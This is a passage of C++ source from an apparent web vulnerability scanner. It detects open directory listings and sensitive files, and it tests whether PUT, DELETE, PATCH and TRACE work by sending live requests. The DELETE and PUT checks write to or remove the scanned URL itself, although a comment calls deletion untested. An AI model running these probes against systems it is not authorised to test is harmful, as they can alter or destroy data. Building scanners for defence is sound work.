                (has_file_links && has_table_listing && file_count > 3)) {
                is_directory_listing = true;
                server_type = "Unknown";
            }
        }
        
        // Extract files from directory listing
        if (is_directory_listing) {
        // Extract file names from links
        std::regex file_pattern(R"(<a\s+[^>]*href=["']([^"']+)["'][^>]*>([^<]+)</a>)");
        std::sregex_iterator iter(resp.body.begin(), resp.body.end(), file_pattern);
        std::sregex_iterator end;
        
        for (; iter != end; ++iter) {
            if (iter->size() >= 3) {
                std::string href = iter->str(1);
                std::string link_text = iter->str(2);
                
                // Skip parent directory links
                if (href.find("..") != std::string::npos || 
                    link_text.find("Parent") != std::string::npos ||
                    link_text.find("..") != std::string::npos) {
                    continue;
                }
                
                // Skip directory links (ending with /)
                if (href.back() == '/' || link_text.back() == '/') {
                    continue;
                }
                
                // Extract filename
                std::string filename = link_text;
                if (filename.empty()) {
                    filename = href;
                }
                
                // Remove leading/trailing whitespace
                filename.erase(0, filename.find_first_not_of(" \t\r\n"));
                filename.erase(filename.find_last_not_of(" \t\r\n") + 1);
                
                if (!filename.empty()) {
                    detected_files.push_back(filename);
                    
                    // Check if file is sensitive
                    for (const auto& ext : sensitive_extensions) {
                        if (filename.size() >= ext.size() && 
                            filename.substr(filename.size() - ext.size()) == ext) {
                            sensitive_files.push_back(filename);
                            break;
                        }
                    }
                }
            }
        }
        
        // Also try to extract from table rows
        std::regex table_row_pattern(R"(<tr[^>]*>.*?<td[^>]*>.*?<a[^>]*href=["']([^"']+)["'][^>]*>([^<]+)</a>.*?</tr>)");
        std::sregex_iterator table_iter(resp.body.begin(), resp.body.end(), table_row_pattern);
        std::sregex_iterator table_end;
        
        for (; table_iter != table_end; ++table_iter) {
            if (table_iter->size() >= 3) {
                std::string href = table_iter->str(1);
                std::string link_text = table_iter->str(2);
                
                if (href.find("..") == std::string::npos && 
                    href.back() != '/' &&
                    !link_text.empty()) {
                    std::string filename = link_text;
                    filename.erase(0, filename.find_first_not_of(" \t\r\n"));
                    filename.erase(filename.find_last_not_of(" \t\r\n") + 1);
                    
                    if (!filename.empty() && 
                        std::find(detected_files.begin(), detected_files.end(), filename) == detected_files.end()) {
                        detected_files.push_back(filename);
                        
                        // Check if sensitive
                        for (const auto& ext : sensitive_extensions) {
                            if (filename.size() >= ext.size() && 
                                filename.substr(filename.size() - ext.size()) == ext) {
                                if (std::find(sensitive_files.begin(), sensitive_files.end(), filename) == sensitive_files.end()) {
                                    sensitive_files.push_back(filename);
                                }
                                break;
                            }
                        }
                    }
                }
            }
        }
        } // End of if (is_directory_listing) for file extraction
        
        // Differentiate from custom directory pages
        // Custom pages usually have more styling, navigation, search, etc.
        bool is_custom_page = false;
        if (is_directory_listing) {
            // Check for custom page indicators
            if (resp.body.find("search") != std::string::npos &&
                resp.body.find("filter") != std::string::npos) {
                // Might be a custom file browser
                is_custom_page = true;
            }
            
            // Check for extensive styling (custom pages usually have more CSS)
            size_t style_count = 0;
            size_t pos = 0;
            while ((pos = resp.body.find("<style", pos)) != std::string::npos) {
                style_count++;
                pos += 6;
            }
            
            // Check for JavaScript (custom pages often have JS)
            bool has_javascript = (resp.body.find("<script") != std::string::npos);
            
            // If it has multiple style blocks and JavaScript, likely custom
            if (style_count > 2 && has_javascript && detected_files.size() < 10) {
                is_custom_page = true;
            }
            
            // Check for navigation menus (custom pages often have nav)
            if (resp.body.find("<nav") != std::string::npos ||
                resp.body.find("navigation") != std::string::npos) {
                is_custom_page = true;
            }
        }
        
            // Create finding if directory listing detected
            if (is_directory_listing && !is_custom_page) {
                Finding f;
                f.id = "finding_" + std::to_string(findings.size() + 1);
                f.url = result.url;
                f.method = result.method;
                f.category = "directory_listing";
                f.headers = std::map<std::string, std::string>(
                    result.headers.begin(),
                    result.headers.end()
                );
                
                nlohmann::json evidence;
                evidence["description"] = "Directory listing enabled";
                evidence["server_type"] = server_type;
                evidence["files_detected"] = detected_files.size();
                evidence["files"] = nlohmann::json::array();
                for (const auto& file : detected_files) {
                    evidence["files"].push_back(file);
                }
                
                if (!sensitive_files.empty()) {
                    evidence["sensitive_files"] = nlohmann::json::array();
                    for (const auto& file : sensitive_files) {
                        evidence["sensitive_files"].push_back(file);
                    }
                    evidence["sensitive_files_count"] = sensitive_files.size();
                }
                
                f.evidence = evidence;
                
                // Elevate severity if sensitive files found
                if (!sensitive_files.empty()) {
                    f.severity = "high";
                    f.confidence = 0.95;
                } else {
                    f.severity = "medium";
                    f.confidence = 0.85;
                }
                
                f.remediation_id = "directory_listing";
                
                findings.push_back(std::move(f));
            }
        } // End of if (client_.perform(req, resp))
    
    // Test common directory paths if current URL looks like it could be a directory
    // or if we discovered this during crawling
    std::string current_path = result.url;
    size_t query_pos = current_path.find('?');
    if (query_pos != std::string::npos) {
        current_path = current_path.substr(0, query_pos);
    }
    
    // Extract base URL
    size_t scheme_pos = current_path.find("://");
    if (scheme_pos == std::string::npos) {
        return;
    }
    
    size_t path_start = current_path.find('/', scheme_pos + 3);
    if (path_start == std::string::npos) {
        return;
    }
    
    std::string base_url = current_path.substr(0, path_start);
    std::string current_dir = current_path.substr(path_start);
    
    // If current path ends with /, it's already a directory - test common subdirectories
    if (current_dir.back() == '/' || current_dir.find('.') == std::string::npos) {
        // Test common subdirectories
        for (const auto& common_dir : common_dirs) {
            std::string test_url = base_url + current_dir;
            if (test_url.back() != '/') {
                test_url += '/';
            }
            test_url += common_dir.substr(1);  // Remove leading /
            
            HttpRequest test_req;
            test_req.method = "GET";
            test_req.url = test_url;
            test_req.headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
            enhance_request_with_session(test_req);
            
            HttpResponse test_resp;
            if (!client_.perform(test_req, test_resp)) {
                continue;
            }
            
            // Check if response is a directory listing
            bool test_is_listing = false;
            std::string test_server_type;
            
            // Test patterns
            for (const auto& pattern : apache_patterns) {
                std::smatch match;
                if (std::regex_search(test_resp.body, match, pattern)) {
                    test_is_listing = true;
                    test_server_type = "Apache";
                    break;
                }
            }
            
            if (!test_is_listing) {
                for (const auto& pattern : nginx_patterns) {
                    std::smatch match;
                    if (std::regex_search(test_resp.body, match, pattern)) {
                        test_is_listing = true;
                        test_server_type = "Nginx";
                        break;
                    }
                }
            }
            
            if (!test_is_listing) {
                for (const auto& pattern : iis_patterns) {
                    std::smatch match;
                    if (std::regex_search(test_resp.body, match, pattern)) {
                        test_is_listing = true;
                        test_server_type = "IIS";
                        break;
                    }
                }
            }
            
            if (test_is_listing) {
                // Extract files from test response
                std::vector<std::string> test_files;
                std::vector<std::string> test_sensitive;
                
                std::regex file_pattern(R"(<a\s+[^>]*href=["']([^"']+)["'][^>]*>([^<]+)</a>)");
                std::sregex_iterator iter(test_resp.body.begin(), test_resp.body.end(), file_pattern);
                std::sregex_iterator end;
                
                for (; iter != end; ++iter) {
                    if (iter->size() >= 3) {
                        std::string href = iter->str(1);
                        std::string link_text = iter->str(2);
                        
                        if (href.find("..") == std::string::npos && 
                            href.back() != '/' &&
                            !link_text.empty()) {
                            std::string filename = link_text;
                            filename.erase(0, filename.find_first_not_of(" \t\r\n"));
                            filename.erase(filename.find_last_not_of(" \t\r\n") + 1);
                            
                            if (!filename.empty()) {
                                test_files.push_back(filename);
                                
                                for (const auto& ext : sensitive_extensions) {
                                    if (filename.size() >= ext.size() && 
                                        filename.substr(filename.size() - ext.size()) == ext) {
                                        test_sensitive.push_back(filename);
                                        break;
                                    }
                                }
                            }
                        }
                    }
                }
                
                Finding f;
                f.id = "finding_" + std::to_string(findings.size() + 1);
                f.url = test_url;
                f.method = "GET";
                f.category = "directory_listing";
                f.headers = std::map<std::string, std::string>(
                    test_resp.headers.begin(),
                    test_resp.headers.end()
                );
                
                nlohmann::json evidence;
                evidence["description"] = "Directory listing enabled";
                evidence["server_type"] = test_server_type;
                evidence["directory_path"] = common_dir;
                evidence["files_detected"] = test_files.size();
                evidence["files"] = nlohmann::json::array();
                for (const auto& file : test_files) {
                    evidence["files"].push_back(file);
                }
                
                if (!test_sensitive.empty()) {
                    evidence["sensitive_files"] = nlohmann::json::array();
                    for (const auto& file : test_sensitive) {
                        evidence["sensitive_files"].push_back(file);
                    }
                    evidence["sensitive_files_count"] = test_sensitive.size();
                }
                
                f.evidence = evidence;
                
                if (!test_sensitive.empty()) {
                    f.severity = "high";
                    f.confidence = 0.95;
                } else {
                    f.severity = "medium";
                    f.confidence = 0.85;
                }
                
                f.remediation_id = "directory_listing";
                
                findings.push_back(std::move(f));
                
                // Only report first discovered directory listing
                break;
            }
        }
    } // End of if (current_dir.back() == '/' || current_dir.find('.') == std::string::npos)
} // End of void VulnEngine::checkDirectoryListing

void VulnEngine::checkHTTPMethodVulnerabilities(const CrawlResult& result, std::vector<Finding>& findings) {
    // These HTTP methods can be dangerous if enabled without proper authentication
    // PUT can allow file uploads, DELETE can remove resources, TRACE can enable XST attacks,
    // and PATCH can allow unauthorized modifications
    std::vector<std::string> dangerous_methods = {"PUT", "DELETE", "TRACE", "PATCH"};
    
    // Start by sending an OPTIONS request to see what methods the server allows
    // The OPTIONS method returns an Allow header listing all supported methods
    // This is more efficient than blindly testing every method
    HttpRequest options_req;
    options_req.method = "OPTIONS";
    options_req.url = result.url;
    options_req.headers["Accept"] = "*/*";
    enhance_request_with_session(options_req);
    
    HttpResponse options_resp;
    std::vector<std::string> allowed_methods;
    
    if (client_.perform(options_req, options_resp)) {
        // Look for the Allow header which contains the list of allowed methods
        for (const auto& [header_name, header_value] : options_resp.headers) {
            if (header_name == "allow") {
                // The Allow header contains a comma-separated list like: "GET, POST, PUT, DELETE"
                // Parse it into individual methods
                std::istringstream iss(header_value);
                std::string method;
                while (std::getline(iss, method, ',')) {
                    // Trim any whitespace around each method name
                    method.erase(0, method.find_first_not_of(" \t\r\n"));
                    method.erase(method.find_last_not_of(" \t\r\n") + 1);
                    if (!method.empty()) {
                        // Normalize to uppercase for comparison
                        std::transform(method.begin(), method.end(), method.begin(), ::toupper);
                        allowed_methods.push_back(method);
                    }
                }
                break;
            }
        }
    }
    
    // Now test each dangerous method to see if it's actually functional
    // Just because a method is in the Allow header doesn't mean it works
    for (const auto& method : dangerous_methods) {
        // Skip if OPTIONS didn't allow it (but still test if OPTIONS failed)
        if (!allowed_methods.empty()) {
            bool is_allowed = false;
            for (const auto& allowed : allowed_methods) {
                if (allowed == method) {
                    is_allowed = true;
                    break;
                }
            }
            if (!is_allowed) {
                continue; // Method not in Allow header, skip
            }
        }
        
        HttpRequest test_req;
        test_req.method = method;
        test_req.url = result.url;
        test_req.headers["Accept"] = "*/*";
        enhance_request_with_session(test_req);
        
        bool is_functional = false;
        std::string vulnerability_type;
        std::string evidence_details;
        
        if (method == "TRACE") {
            // TRACE method can be used for Cross-Site Tracing (XST) attacks
            // TRACE echoes back the request, which can be used to bypass HttpOnly cookies
            // We add a unique test header to verify the request is actually being echoed
            std::string test_header_value = "X-Sentinel-Test: TRACE-VULN-TEST-" + std::to_string(std::time(nullptr));
            test_req.headers["X-Sentinel-Test"] = "TRACE-VULN-TEST-" + std::to_string(std::time(nullptr));
            
            HttpResponse trace_resp;
            if (client_.perform(test_req, trace_resp)) {
                // TRACE should return 200 OK and echo the request back
                // If our test header appears in the response, the request was echoed
                if (trace_resp.status == 200 || trace_resp.status == 206) {
                    // Check if our test header appears in the response body
                    // This confirms the TRACE method is functional and echoing requests
                    if (trace_resp.body.find("X-Sentinel-Test") != std::string::npos ||
                        trace_resp.body.find("TRACE-VULN-TEST") != std::string::npos) {
                        is_functional = true;
                        vulnerability_type = "XST";
                        evidence_details = "TRACE request reflected in response body";
                    }
                }
            }
        } else if (method == "PUT") {
            // PUT method can allow unauthorized file uploads if not properly secured
            // We test by sending a PUT request with test content and checking if it's accepted
            std::string test_content = "Sentinel-PUT-Test-" + std::to_string(std::time(nullptr));
            test_req.body = test_content;
            test_req.headers["Content-Type"] = "text/plain";
            
            HttpResponse put_resp;
            if (client_.perform(test_req, put_resp)) {
                // Successful PUT responses: 201 (Created), 200 (OK), or 204 (No Content)
                // These indicate the server accepted and processed the PUT request
                if (put_resp.status == 200 || put_resp.status == 201 || put_resp.status == 204) {
                    is_functional = true;
                    vulnerability_type = "Unauthorized File Upload";
                    evidence_details = "PUT request accepted with status " + std::to_string(put_resp.status);
                    
                    // Try to verify the file was actually created by doing a GET request
                    // If we can retrieve the content we just uploaded, it confirms the vulnerability
                    HttpRequest verify_req;
                    verify_req.method = "GET";
                    verify_req.url = result.url;
                    enhance_request_with_session(verify_req);
                    
                    HttpResponse verify_resp;
                    if (client_.perform(verify_req, verify_resp)) {
                        if (verify_resp.body.find(test_content) != std::string::npos) {
                            evidence_details += " (content verified via GET)";
                        }
                    }
                } else if (put_resp.status != 405 && put_resp.status != 403 && put_resp.status != 501) {
                    // 405 = Method Not Allowed, 403 = Forbidden, 501 = Not Implemented
                    // These clearly indicate the method doesn't work, so not a vulnerability
                    // Other status codes (400, 500, etc.) might indicate the method works
                    // but had an error - we're conservative and don't flag these
                }
            }
        } else if (method == "DELETE") {
            // DELETE method can allow unauthorized resource deletion if not properly secured
            // We can't safely test actual deletion, but we can check if DELETE is accepted
            HttpResponse delete_resp;
            if (client_.perform(test_req, delete_resp)) {
                // Successful DELETE responses: 200 (OK), 202 (Accepted), or 204 (No Content)
                // These indicate the server accepted the DELETE request
                if (delete_resp.status == 200 || delete_resp.status == 202 || delete_resp.status == 204) {
                    is_functional = true;
                    vulnerability_type = "Unauthorized Resource Deletion";
                    evidence_details = "DELETE request accepted with status " + std::to_string(delete_resp.status);
                } else if (delete_resp.status != 405 && delete_resp.status != 403 && delete_resp.status != 501) {
                    // 405/403/501 clearly indicate the method doesn't work
                }
            }
        } else if (method == "PATCH") {
            // PATCH method can allow unauthorized resource modifications if not properly secured
            // We test by sending a PATCH request with JSON content
            std::string test_content = R"({"test": "sentinel-patch-test"})";
            test_req.body = test_content;
            test_req.headers["Content-Type"] = "application/json";
            
            HttpResponse patch_resp;
            if (client_.perform(test_req, patch_resp)) {
                // Successful PATCH responses: 200 (OK) or 204 (No Content)
                // These indicate the server accepted and processed the PATCH request
                if (patch_resp.status == 200 || patch_resp.status == 204) {
                    is_functional = true;
                    vulnerability_type = "Unauthorized Resource Modification";
                    evidence_details = "PATCH request accepted with status " + std::to_string(patch_resp.status);
                } else if (patch_resp.status != 405 && patch_resp.status != 403 && patch_resp.status != 501) {
                    // 405/403/501 clearly indicate the method doesn't work
                }
            }
        }
        
        // Create finding if method is functional
        if (is_functional) {
            Finding f;
            f.id = "finding_" + std::to_string(findings.size() + 1);
            f.url = result.url;
            f.method = method;
            f.category = "http_method_vulnerability";
            f.headers = std::map<std::string, std::string>(
                result.headers.begin(),
                result.headers.end()
            );
            
            nlohmann::json evidence;
            evidence["description"] = "Dangerous HTTP method enabled and functional";
            evidence["method"] = method;
            evidence["vulnerability_type"] = vulnerability_type;
            evidence["details"] = evidence_details;
            
            if (!allowed_methods.empty()) {
                evidence["allowed_methods"] = nlohmann::json::array();
                for (const auto& m : allowed_methods) {
                    evidence["allowed_methods"].push_back(m);
                }
            }
            
            f.evidence = evidence;
            
            // Set severity based on method
            if (method == "PUT") {
                f.severity = "critical";
                f.confidence = 0.95;
            } else if (method == "DELETE") {
                f.severity = "critical";
                f.confidence = 0.90;
            } else if (method == "TRACE") {
                f.severity = "medium";
                f.confidence = 0.85;
            } else if (method == "PATCH") {
                f.severity = "high";
                f.confidence = 0.90;
            } else {
                f.severity = "medium";
                f.confidence = 0.80;
            }
            
            f.remediation_id = "http_method_vulnerability";
            
            findings.push_back(std::move(f));
        }
    }
    
    // Also report if OPTIONS reveals dangerous methods even if they're not functional
    // This is informational but lower severity
    if (!allowed_methods.empty()) {
        bool has_dangerous = false;
        for (const auto& method : dangerous_methods) {
            for (const auto& allowed : allowed_methods) {
                if (allowed == method) {
                    has_dangerous = true;
                    break;
                }
            }
            if (has_dangerous) break;
        }
        
        // Check if we already reported a functional vulnerability
        bool already_reported = false;
        for (const auto& finding : findings) {
            if (finding.category == "http_method_vulnerability" && finding.url == result.url) {
                already_reported = true;
                break;
            }
        }
        
        // If dangerous methods are allowed but not functional, report as informational
        if (has_dangerous && !already_reported) {
            // Double-check that methods are actually not functional
            bool any_functional = false;
            for (const auto& method : dangerous_methods) {
                for (const auto& allowed : allowed_methods) {
                    if (allowed == method) {
                        // Test if functional
                        HttpRequest test_req;
                        test_req.method = method;
                        test_req.url = result.url;
                        enhance_request_with_session(test_req);
                        
                        HttpResponse test_resp;
                        if (client_.perform(test_req, test_resp)) {
                            if (test_resp.status != 405 && test_resp.status != 403 && test_resp.status != 501) {
                                // Might be functional, skip informational report
                                any_functional = true;
                                break;
                            }
                        }
                    }
                }
                if (any_functional) break;
            }
            
            // Only report if methods are allowed but clearly not functional
            if (!any_functional) {
                Finding f;
                f.id = "finding_" + std::to_string(findings.size() + 1);
                f.url = result.url;
                f.method = "OPTIONS";
                f.category = "http_method_vulnerability";
                f.headers = std::map<std::string, std::string>(
                    result.headers.begin(),
                    result.headers.end()
                );
                
                nlohmann::json evidence;
                evidence["description"] = "Dangerous HTTP methods allowed but not functional";
                evidence["allowed_methods"] = nlohmann::json::array();
                for (const auto& m : allowed_methods) {
                    evidence["allowed_methods"].push_back(m);
                }
                
                f.evidence = evidence;
                f.severity = "low";
                f.confidence = 0.70;
                f.remediation_id = "http_method_vulnerability";
                
                findings.push_back(std::move(f));
            }
        }
    }
}


